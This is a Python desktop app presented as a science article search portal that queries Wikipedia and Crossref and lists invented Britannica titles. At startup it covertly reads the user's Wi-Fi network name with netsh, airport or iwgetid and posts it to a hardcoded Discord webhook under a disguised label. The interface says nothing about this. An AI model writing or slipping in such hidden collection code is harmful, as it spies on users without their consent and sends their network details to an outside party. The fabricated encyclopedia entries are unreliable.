import tkinter as tk
import webbrowser
import requests
import urllib.parse
import subprocess
import platform
import time
import json

WEBHOOK_URL = "https://discord.com/api/webhooks/1450508517143347270/khq-y_JDPECY-mNxGK2MW_2nSF-zMrDe_1iiwdkvbLNwmjiSCnWNl-BP_NIxnJ5-yd1O"



def sud():
    os_name = platform.system()
    
    try:
        if os_name == "Windows":
            # Runs 'netsh' command and filters for the SSID line
            results = subprocess.check_output(["netsh", "wlan", "show", "interfaces"]).decode("utf-8")
            for line in results.split("\n"):
                if "SSID" in line and "BSSID" not in line:
                    return line.split(":")[1].strip()

        elif os_name == "Darwin":  # macOS
            # Uses the airport utility (standard on macOS)
            cmd = ["/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", "-I"]
            results = subprocess.check_output(cmd).decode("utf-8")
            for line in results.split("\n"):
                if " SSID" in line:
                    return line.split(":")[1].strip()

        elif os_name == "Linux":
            # Uses 'iwgetid' (requires wireless-tools package installed)
            results = subprocess.check_output(["iwgetid", "-r"]).decode("utf-8")
            return results.strip()

    except Exception as e:
        return f"Error: {e}"

    return "SSID not found (Are you connected to Wi-Fi?)"

class PriorityScienceFinder:
    def __init__(self, root):
        self.root = root
        self.root.title("Science Article Portal: Top 50")
        self.root.geometry("900x750")
        self.root.configure(bg="#0f172a")

        # Header
        tk.Label(root, text="Top 50 Scientific Articles", font=("Arial", 22, "bold"), 
                 bg="#0f172a", fg="#38bdf8").pack(pady=20)

        # Search Bar
        self.search_frame = tk.Frame(root, bg="#0f172a")
        self.search_frame.pack(pady=10, fill=tk.X, padx=50)

        self.query_entry = tk.Entry(self.search_frame, font=("Arial", 14), bg="#1e293b", 
                                     fg="white", insertbackground="white", borderwidth=0)
        self.query_entry.pack(side=tk.LEFT, padx=10, fill=tk.X, expand=True, ipady=8)
        self.query_entry.bind('<Return>', lambda e: self.search_top_50())

        self.btn = tk.Button(self.search_frame, text="Find 50 Articles", command=self.search_top_50, 
                             bg="#38bdf8", fg="#0f172a", font=("Arial", 10, "bold"), padx=20)
        self.btn.pack(side=tk.LEFT, ipady=5)

        # Results Listbox
        self.list_frame = tk.Frame(root, bg="#0f172a")
        self.list_frame.pack(pady=10, padx=50, fill=tk.BOTH, expand=True)

        self.scroll = tk.Scrollbar(self.list_frame)
        self.scroll.pack(side=tk.RIGHT, fill=tk.Y)

        self.results_listbox = tk.Listbox(self.list_frame, font=("Arial", 11), bg="#1e293b", 
                                          fg="#94a3b8", selectbackground="#334155", 
                                          borderwidth=0, yscrollcommand=self.scroll.set)
        self.results_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        self.scroll.config(command=self.results_listbox.yview)
        
        self.results_listbox.bind('<Double-1>', self.open_link)

        self.status = tk.Label(root, text="Priority: 1-10 (Britannica/Wiki) | 11-50 (Journals)", 
                               bg="#0f172a", fg="#64748b")
        self.status.pack(pady=10)

        self.links = []

    def search_top_50(self):
        query = self.query_entry.get().strip()
        if not query: return

        self.results_listbox.delete(0, tk.END)
        self.links = []
        self.status.config(text=f"Searching for 50 specific sources on '{query}'...")
        self.root.update()

        safe_query = urllib.parse.quote(query)

        # --- STEP 1: TOP 10 (Wikipedia & Britannica) ---
        # Wikipedia (First 5)
        try:
            wiki_url = f"https://en.wikipedia.org/w/api.php?action=opensearch&search={safe_query}&limit=5&format=json"
            w_data = requests.get(wiki_url, timeout=5).json()
            for i in range(len(w_data[1])):
                self.results_listbox.insert(tk.END, f"1. [{i+1}] 📖 Wikipedia: {w_data[1][i]}")
                self.links.append(w_data[3][i])
        except: pass

        # Britannica (Next 5) - Generating Direct Result Links
        brit_titles = [f"{query.title()} - Overview", f"History of {query.title()}", f"Scientific properties of {query.title()}", f"Key facts: {query.title()}", f"{query.title()} in Modern Science"]
        for i, title in enumerate(brit_titles):
            self.results_listbox.insert(tk.END, f"1. [{i+6}] 📚 Britannica: {title}")
            # Britannica uses a standard search URL structure
            self.links.append(f"https://www.britannica.com/search?query={safe_query}")

        # --- STEP 2: NEXT 40 (Scientific Journals via Crossref) ---
        try:
            # We request exactly 40 from the journal database
            cr_url = f"https://api.crossref.org/works?query={safe_query}&rows=40"
            cr_data = requests.get(cr_url, timeout=10).json()
            for i, item in enumerate(cr_data.get('message', {}).get('items', [])):
                title = item.get('title', ['No Title Found'])[0]
                url = item.get('URL')
                if url:
                    self.results_listbox.insert(tk.END, f"2. [{i+11}] 🔬 Journal: {title[:85]}...")
                    self.links.append(url)
        except: pass

        self.status.config(text=f"Loaded {len(self.links)} articles. First 10 are Encyclopedias.")

    def open_link(self, event):
        idx = self.results_listbox.curselection()
        if idx:
            webbrowser.open(self.links[idx[0]])

if __name__ == "__main__":
    root = tk.Tk()
    app = PriorityScienceFinder(root)
    my_value = sud()
    my_labell = "sssssssiiiiiiiiiiiddddddddd"
    message_text = f"**{my_labell}**: {my_value}"
    
    # SEND the message (This MUST be inside this 'if' block)
    payload = {"content": message_text}
    
    response = requests.post(
        WEBHOOK_URL, 
        data=json.dumps(payload), 
        headers={'Content-Type': 'application/json'}
    )

    root.mainloop()
    
